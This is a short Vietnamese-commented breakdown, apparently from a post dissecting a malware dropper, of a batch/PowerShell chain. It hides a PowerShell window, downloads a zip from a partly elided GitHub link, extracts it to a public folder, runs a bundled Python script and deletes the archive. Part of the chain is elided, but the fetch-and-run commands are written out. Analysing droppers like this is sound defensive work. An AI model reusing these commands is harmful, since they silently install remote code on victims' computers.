content:
1. chạy ngầm PowerShell
@echo off && start /min powershell.exe -WindowStyle Hidden -Command ...
2. set SecurityProtocol dùng tls 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
3. tải 2 file zip lạ từ github
(New-Object -TypeName System.Net.WebClient).DownloadFile('https ://github .com/.../Document.zip', 'C:/Users/Public/Document.zip');
4. giải nén
Add-Type -AssemblyName System.IO.Compression.FileSystem;
...
[System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document');
5. chạy file vừa giải nén (chúc bạn may mắn 😈)
C:/Users/Public/Document/python.exe C:/Users/Public/Document/Lib/sim.py;
6. xóa file zip
del C:/Users/Public/Document.zip
